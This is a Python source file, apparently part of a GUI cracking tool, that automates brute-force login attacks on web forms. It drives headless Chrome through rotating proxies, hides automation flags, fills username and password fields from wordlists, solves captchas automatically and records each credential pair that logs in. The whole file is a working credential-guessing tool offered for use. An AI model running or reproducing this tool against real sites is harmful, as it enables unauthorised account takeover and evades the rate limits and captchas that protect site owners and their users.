# -*- coding:utf-8 -*-
# Date: 2021-11-15
# Author:kracer
# Version: 1.0

# -*- coding:utf-8 -*-
# Date: 2021-11-14
# Author:kracer
# Version: 1.0

import time
import os
from selenium import webdriver
from queue import Queue
import threading as th
from common import *
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from concurrent.futures import ThreadPoolExecutor


class processManyIp:
    def __init__(self, result, userInputList):
        self.result = result  # 输出变量
        self.proxyList = []
        self.success = {}
        self.processList(userInputList)
        self.proxyFlag = True
        self.startBruteFlag = True
        self.tryTimes = 3
        self.captcha = ''
        self.ipQueue = Queue()
        self.userQueue = Queue()
        self.passQueue = Queue()
        self.proxyQueue = Queue()
        self.chromeQueue = Queue()


    def processList(self, List):
        """ 对给的数据列表进行预处理 """
        self.threadNum = List[0][0]  # 获取线程数
        if os.path.isfile(List[1][0]):  # 如果输入的是文件
            ipList = []
            tmpUserList = getFileDatas(List[1][0])
            for u in tmpUserList:
                ipList.append(processUrl(u))
            self.ipList = isManyAlive(self.result, ipList)
        else:
            self.ipList = [List[1][0]]
        if ":" in List[2][0]:  # 如果输入的是文件
            self.userList = getFileDatas(List[2][0])
            self.xpathUser = List[2][1]
        else:
            self.userList = [List[2][0]]
            self.xpathUser = List[2][1]
        if ":" in List[3][0]:  # 如果输入的是文件
            self.passList = getFileDatas(List[3][0])
            self.xpathPass = List[3][1]
        else:
            self.passList = [List[3][0]]
            self.xpathPass = List[3][1]
        if List[4] != []:
            if ":" in List[4][0]:
                self.captchaUrl = processUrl(List[4][0])
                self.xpathCaptcha = List[4][1]
        else:
            self.captchaUrl = ''
        if List[5] != []:
            self.xpathSubmit = List[5][0]
        if List[6] != []:
            if os.path.isfile(List[6][0]):  # 如果输入的是文件
                tmpProxy = getFileDatas(List[6][0])
                for p in tmpProxy:
                    self.proxyList.append(processUrl(p))
            else:
                self.proxyList = [List[6][0]]
        if List[7] != []:
            self.chromePath = List[7][0]


    def init(self, proxy):
        """ 对chromedriver的初始化设置 """
        options = webdriver.ChromeOptions()
        options.add_argument('lang=zh_CN.UTF-8')  # 设置中文
        options.add_argument('user-agent="Mozilla/5.0 (iPod; U; CPU iPhone OS 2_1 like Mac OS X; ja-jp) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5F137 Safari/525.20"')  # 更换头部
        options.add_argument('--ignore-certificate-errors')  # 解决https安全问题，忽视并继续操作
        options.add_argument('--blink-settings=imagesEnabled=false')  # 不加载图片, 提升速度
        options.add_argument('--headless')  # 浏览器不提供可视化页面
        options.add_argument('--disable-gpu')  # 加上这个属性来规避bug
        options.add_experimental_option('excludeSwitches', ['enable-automation'])  # 模拟正常浏览器，反爬虫
        if proxy != ' ':
            options.add_argument('--proxy-server=%s' % proxy)
        browser = webdriver.Chrome(self.chromePath, chrome_options=options)
        return browser


    def addQueue(self, List, Queue):
        """ 给队列添加数据 """
        try:
            for i in List:
                Queue.put_nowait(i)
        except Exception as e:
            print(e)


    def addChromeQueue(self, num, Queue):
        """ 添加chrome队列数值 """
        for i in range(num):
            if not self.proxyQueue.empty():
                Queue.put_nowait(self.init(self.proxyQueue.get_nowait()))
            else:
                self.proxyFlag = False
                proxy = ' '
                Queue.put_nowait(self.init(proxy))


    def quitChrome(self):
        """ 停掉所有的chrome """
        while not self.chromeQueue.empty():
            chrome = self.chromeQueue.get_nowait()
            chrome.quit()


    def startMoreThread(self):
        self.addQueue(self.ipList, self.ipQueue)
        if self.proxyList != []:
            self.addQueue(self.proxyList, self.proxyQueue)
        self.addChromeQueue(self.threadNum, self.chromeQueue)
        """ 开启多线程 """
        threadPool = ThreadPoolExecutor(max_workers=self.threadNum, thread_name_prefix="browser")
        self.result.insert("end", "[+] 初始化成功，努力打开网页中，给我点时间......\n")
        self.result.see("end")
        while not self.ipQueue.empty():
            url = self.ipQueue.get_nowait()
            for userName in self.userList:
                for passWord in self.passList:
                    self.success.setdefault(userName, False)
                    threadPool.submit(self.run, url, userName, passWord)


    def run(self, url, userName, passWord):
        """ 开始提交表单进行爆破 """
        if threadStopFlag == False:
            if self.success[userName] == False:
                browser = self.chromeQueue.get_nowait()
                try:
                    browser.get(url)
                    self.startBruteFlag = True
                except Exception as e:
                    if "ERR_PROXY_CONNECTION_FAILED" in str(e):
                        self.startBruteFlag = False
                        browser.close()
                        browser.quit()
                        self.result.insert("end", "[-] {0} 当前代理无法建立连接, 正在尝试更换代理！\n".format(th.current_thread().name))
                        self.result.see("end")
                        self.addChromeQueue(1, self.chromeQueue)
                        self.run(url, userName, passWord)
                    else:
                        self.startBruteFlag = False
                        self.chromeQueue.put_nowait(browser)
                if self.startBruteFlag:
                    try:
                        ''' 等待chrome浏览器的加载完成 '''
                        element = WebDriverWait(browser, 8).until(EC.presence_of_element_located((By.XPATH, self.xpathSubmit)))
                        # 获取未登入成功前的url地址
                        noLoginUrl = browser.current_url
                        # 移除用户名和密码前后的空格和换行符！！！（必要操作）
                        putUser = userName.strip()
                        putPasswd = passWord.strip()
                        # 先清空输入栏已存在的用户名和密码
                        browser.find_element_by_xpath(self.xpathUser).clear()
                        browser.find_element_by_xpath(self.xpathPass).clear()
                        # 自动输入用户名密码
                        browser.find_element_by_xpath(self.xpathUser).send_keys(putUser)
                        browser.find_element_by_xpath(self.xpathPass).send_keys(putPasswd)
                        if self.captchaUrl != '':
                            self.captcha = codeShiBie(self.captchaUrl, self.result)
                            try:
                                """ 解决登入错误达到一定次数后才出现验证码的情况 """
                                browser.find_element_by_xpath(self.xpathCaptcha).send_keys(self.captcha)
                            except Exception as e3:
                                pass
                        # 自动点击登录按钮
                        browser.find_element_by_xpath(self.xpathSubmit).click()
                        time.sleep(2)
                        self.result.insert("end", '[+] 线程{0}, 目前爆破进度到：{1} -- {2}：{3}\n'.format(th.current_thread().name, url, putUser, putPasswd))
                        self.result.see("end")
                        # 获取点击登入后的url地址，判断是否登入成功
                        loginUrl = browser.current_url
                        if noLoginUrl != loginUrl:
                            self.success[userName] = True
                            result = "{0} 爆破成功: 用户名：{1} --- 密码：{2}".format(url, putUser, putPasswd)
                            self.result.insert("end", "[+] {0}\n".format(result))
                            self.result.see("end")
                            successList.append(result)
                            """ 生成结果文件 """
                            resultOutput(result)
                        browser.execute_script("location.reload()")
                        self.chromeQueue.put_nowait(browser)
                    except Exception as e2:
                        self.chromeQueue.put_nowait(browser)
                        if self.tryTimes > 0:
                            self.result.insert("end", '[-] {0} 未检测到xpath元素, 检测输入的xpath路径是否正确！\n'.format(url))
                            self.result.see("end")
                            self.tryTimes -= 1
                            self.run(url, userName, passWord)
                        else:
                            stop_thread(th.current_thread())
            else:
                stop_thread(th.current_thread())
        else:
            self.quitChrome()
            stop_thread(th.current_thread())





